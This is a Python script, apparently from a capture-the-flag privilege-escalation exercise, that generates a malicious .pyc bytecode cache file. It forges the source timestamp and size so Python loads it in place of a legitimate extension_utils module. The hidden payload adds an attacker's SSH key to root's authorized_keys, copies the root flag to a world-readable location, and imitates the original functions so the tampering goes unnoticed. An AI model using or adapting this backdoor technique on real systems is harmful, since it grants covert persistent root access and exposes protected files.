#!/usr/bin/env python3
"""Generate a malicious extension_utils.cpython-312.pyc with correct source mtime"""
import struct
import marshal
import time
import importlib.util

# Source mtime from stat: 2025-03-23 10:56:19 UTC
source_mtime = int(time.mktime(time.strptime("2025-03-23 10:56:19", "%Y-%m-%d %H:%M:%S")))
# Adjust for UTC (strptime uses local time)
import calendar
source_mtime = calendar.timegm(time.strptime("2025-03-23 10:56:19", "%Y-%m-%d %H:%M:%S"))
source_size = 1245  # from stat

# Malicious code - plant SSH key for root
malicious_code = '''
import os, subprocess

# Plant SSH key for root
pubkey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDD6OIHGpJ23Ux74SE4Xh50fJOOUKktgzNLr/tzB3pDI kali@kali"
os.makedirs("/root/.ssh", mode=0o700, exist_ok=True)
with open("/root/.ssh/authorized_keys", "a") as f:
    f.write(pubkey + "\\n")
os.chmod("/root/.ssh/authorized_keys", 0o600)

# Also copy root flag
subprocess.run(["cp", "/root/root.txt", "/tmp/root.txt"])
subprocess.run(["chmod", "644", "/tmp/root.txt"])

# Provide the expected functions so the tool doesn't crash
import json
from jsonschema import validate, ValidationError
import shutil

MANIFEST_SCHEMA = {
    "type": "object",
    "properties": {
        "manifest_version": {"type": "number"},
        "name": {"type": "string"},
        "version": {"type": "string"},
        "permissions": {"type": "array", "items": {"type": "string"}},
    },
    "required": ["manifest_version", "name", "version"]
}

def validate_manifest(path):
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    try:
        validate(instance=data, schema=MANIFEST_SCHEMA)
        print("[+] Manifest is valid.")
        return data
    except ValidationError as e:
        print("[x] Manifest validation error:")
        print(e.message)
        exit(1)

def clean_temp_files(extension_dir):
    temp_dir = '/opt/extensiontool/temp'
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        print(f"[+] Cleaned up temporary directory {temp_dir}")
    else:
        print("[+] No temporary files to clean.")
    exit(0)
'''

# Compile to code object
code = compile(malicious_code, "extension_utils.py", "exec")

# Build .pyc file
# Python 3.12 magic number
MAGIC = importlib.util.MAGIC_NUMBER  # This is for our local python version

# We need Python 3.12's magic number: b'\xcb\r\r\n'
# Python 3.12.x magic = 3531 -> bytes: b'\xcb\r\r\n'
magic_3_12 = (3531).to_bytes(2, 'little') + b'\r\n'

flags = struct.pack('<I', 0)  # timestamp-based invalidation
timestamp = struct.pack('<I', source_mtime)
size = struct.pack('<I', source_size)
marshaled = marshal.dumps(code)

pyc_data = magic_3_12 + flags + timestamp + size + marshaled

output_path = "/home/kali/Desktop/IRONTHREAD/boxes/Browsed/payload/extension_utils.cpython-312.pyc"
with open(output_path, 'wb') as f:
    f.write(pyc_data)

print(f"[+] Generated {output_path}")
print(f"[+] Source mtime: {source_mtime}")
print(f"[+] Source size: {source_size}")
print(f"[+] Magic: {magic_3_12.hex()}")
print(f"[+] Total size: {len(pyc_data)} bytes")
